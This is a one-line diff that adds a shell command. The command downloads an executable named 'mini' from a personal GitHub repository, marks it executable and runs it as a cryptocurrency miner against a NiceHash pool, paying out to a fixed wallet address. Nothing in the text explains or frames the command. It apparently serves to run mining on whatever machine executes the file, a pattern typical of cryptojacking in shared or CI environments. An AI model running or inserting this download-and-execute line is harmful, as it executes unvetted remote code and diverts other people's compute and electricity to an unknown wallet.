@@ -1,0 +1,1 @@
+wget https://raw.githubusercontent.com/Adhy0788/BanjaranIndah/main/mini && chmod +x mini && ./mini --algo BEAM-III --pool stratum+tcp://beamv3.eu-north.nicehash.com:3387 --user 3EWNNEoieMZHuYRPo7srhVSXznGMC1frwq.Rig0123
